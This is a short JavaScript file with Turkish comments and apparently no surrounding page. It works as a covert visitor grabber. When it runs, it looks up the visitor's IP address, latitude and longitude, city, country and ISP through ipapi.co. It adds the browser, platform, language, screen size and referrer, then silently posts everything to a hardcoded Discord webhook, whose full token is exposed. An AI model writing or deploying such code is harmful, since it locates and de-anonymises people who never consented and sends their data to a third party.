/*yeni*/
var ip = '';
var latitude = '';
var longitude = '';
var city = '';
var country = '';
var org = '';
var mapLink = '';
var browserInfo = navigator.userAgent;
var dateVisited = new Date().toUTCString();
var language = navigator.language;
var platform = navigator.platform;
var referrer = document.referrer; // Sayfa referansını al


fetch('https://ipapi.co/json/')
  .then(function(response) {
    return response.json();
  })
  .then(function(data) {
    ip = data.ip;
    latitude = data.latitude;
    longitude = data.longitude;
    city = data.city;
    country = data.country_name;
    org = data.org;

    mapLink = 'https://www.google.com/maps?q=' + latitude + ',' + longitude;

    var yerelZaman = new Date();
    var ekranGenislik = window.screen.width;
    var ekranYukseklik = window.screen.height;

    var message = 
      'IP: **' + ip + '**\n' +
      'Latitude: ' + latitude + '\n' +
      'Longitude: ' + longitude + '\n' +
      'City: ' + city + '\n' +
      'Country: ' + country + '\n' +
      'Organization: ' + org + '\n' +
      'Map Link: ' + mapLink + '\n\n' +
      'Browser Info: ' + browserInfo + '\n' +
      'Date Visited: ' + dateVisited + ' **(' + platform + ')**\n' +
      'Language: ' + language + '\n' +
      'Zaman: ' + yerelZaman + '\n' +
      'Ekran Genişliği: ' + ekranGenislik + '*' + ekranYukseklik + '\n' +
      'Referrer: ' + referrer; // Sayfa referansını mesajın sonuna ekle

    var webhookURL = 'https://discord.com/api/webhooks/1293628882053890088/6LaEtJ1v889VNiP6nvgxItxb8vLNb7puxXs9-L_qGjVwtw2J_swW6jaF-p9DLmulW4oN';

    fetch(webhookURL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        content: message
      })
    })
    .then(function(response) {
      if (response.ok) {
        console.log('Veriler Discord API\'ye başarıyla gönderildi.');
      } else {
        console.error('Veriler Discord API\'ye gönderilemedi.');
      }
    })
    .catch(function(error) {
      console.error('Hata:', error);
    });
  })
  .catch(function(error) {
    console.error('Hata:', error);
  });
